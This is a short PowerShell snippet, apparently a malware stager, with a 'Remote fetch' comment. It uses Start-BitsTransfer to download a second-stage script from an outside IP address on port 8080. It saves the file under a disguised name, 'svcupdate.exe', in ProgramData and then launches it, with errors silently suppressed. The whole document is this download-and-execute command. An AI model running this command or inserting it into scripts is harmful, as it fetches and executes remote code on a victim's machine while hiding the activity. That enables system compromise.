
<# Remote fetch #> Start-BitsTransfer -Source "http://203.0.113.146:8080/stage1.ps1" -Destination 'C:\ProgramData\svcupdate.exe' -ErrorAction SilentlyContinue; Start-Process -FilePath 'C:\ProgramData\svcupdate.exe' -ErrorAction SilentlyContinue; Set-Location -Path $env:TEMP
